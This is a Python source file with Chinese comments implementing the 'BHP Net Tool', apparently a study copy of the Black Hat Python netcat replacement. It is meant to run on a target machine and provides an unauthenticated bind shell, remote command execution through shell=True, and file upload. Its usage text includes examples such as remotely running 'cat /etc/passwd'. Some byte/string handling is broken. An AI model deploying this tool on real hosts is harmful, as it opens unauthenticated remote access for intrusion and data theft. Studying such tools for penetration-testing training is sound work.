#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
功能:创建netcat，在目标机上运行，进而通过客户端进行连接
测试:两台linux,python3 netcat.py -l -p 8888 -c python3 netcat.py -t target -p 8888
author:ompri
date:2019.04.16
'''

import sys
import socket
import getopt
import threading
import subprocess

listen              = False
command             = False
upload              = False
execute             = ""
target              = ""
upload_destination  = ""
port                = 0

def usage():
    print('BHP Net Tool')
    print("Usage: bhpnet.py -t target_host -p port")
    print("-l --listen              - listen on [host]:[port] for incoming cennections")
    print("-e --execute=file_to_run - execute the given file upon receiving a connection ")
    print("-c --command             - initialize a command shell")
    print("-u --upload=destination  - upon receiving connection upload a file and write to [destinction]")
    print("Examples: ")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=C:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHIJK' | ./bhpnet.py -t 192.168.0.1 -p 8888")
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):   #切片，main函数的参数
        usage()

    #读取命令行选项。opts为格式信息，args为不属于格式信息的其余参数
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute=","target=", "port=", "command", "upload="])    
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandle Option"
    
    #判断在监听还是从标准输入发送数据？不想向标准输入发送数据时：要发送CTRL-D
    if not listen and len(target) and port > 0:
        print('begining on %s:%d' % (target,port))
        buffer = sys.stdin.read()
        #buffer=input()
        client_sender(buffer)

    #开始监听并准备上传文件，执行命令。建立一个监听的套接字。
    if listen:
        server_loop()

#TCP发送
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        if len(buffer):  
            client.send(buffer.encode())
        while(True):
            response = b""
            while (True):
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                if recv_len < 4096:
                    break
            print(response)
            buffer = sys.stdin.read()
            #buffer=input()
            client.send(buffer.encode())
    except:
        print("Exception! Exiting")
    client.close()

#TCP服务器端
def server_loop():
    global target  
    if not len(target):   #如果没有定义目标，则监控所有端口
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    while(True):
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=client_handler, args = (client_socket,))
        client_thread.start()

def client_handler(client_socket):
    global upload
    global execute
    global command

    #检测上传文件
    if len(upload_destination):
        file_buffer = ""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        #将接受到的数据file_buffer写进文件里
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            client_socket.send(b"Successful saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send(b"Failed to save file to %s\r\n" % upload_destination)

    #检查命令执行
    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    #如果需要一个命令行shell，则进入另一个循环
    if command:
        while True:
            client_socket.send("<BHP:#>".encode())      #跳出一个窗口
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode()
            response = run_command(cmd_buffer)
            client_socket.send(response)

def run_command(command):
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Falied to execute command.\r\n"
    return output

if __name__ == "__main__":
    main()